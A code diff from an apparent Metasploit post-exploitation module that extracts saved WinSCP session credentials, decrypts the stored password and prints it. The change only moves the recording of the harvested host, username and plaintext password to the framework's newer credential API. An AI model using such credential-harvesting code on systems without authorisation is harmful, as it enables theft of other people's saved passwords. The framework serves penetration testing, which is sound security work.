@@ -191,7 +191,6 @@ class Metasploit3 < Msf::Post
 
   end
 
-
   def winscp_store_config(config)
     host = config['HostName']
     pass = config['Password']
@@ -208,16 +207,31 @@ class Metasploit3 < Msf::Post
     plaintext = decrypt_password(pass, user+host)
     print_status("Host: #{host}  Port: #{portnum} Protocol: #{sname}  Username: #{user}  Password: #{plaintext}")
 
-    report_auth_info(
-      :host => host,
-      :port => portnum,
-      :sname => sname,
-      :source_id => session_db_id,
-      :source_type => "exploit",
-      :user => user,
-      :pass => plaintext
-    )
+    service_data = {
+      address: host,
+      port: portnum,
+      service_name: sname,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+    }
 
+    credential_data = {
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: self.refname,
+      private_type: :password,
+      private_data: plaintext,
+      username: user
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Credential::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
 end
